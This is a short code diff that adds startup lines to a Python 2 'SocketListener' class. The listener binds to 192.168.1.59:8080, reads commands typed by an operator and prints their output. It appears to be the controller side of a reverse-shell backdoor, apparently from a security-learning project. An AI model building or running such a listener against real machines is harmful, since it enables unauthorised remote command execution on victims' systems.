@@ -21,3 +21,6 @@ class SocketListener:
             command_input = raw_input("enter command: ")
             command_output = self.command_interaction(command_input)
             print(command_output)
+
+socket_listener = SocketListener("192.168.1.59",8080)
+socket_listener.listening()
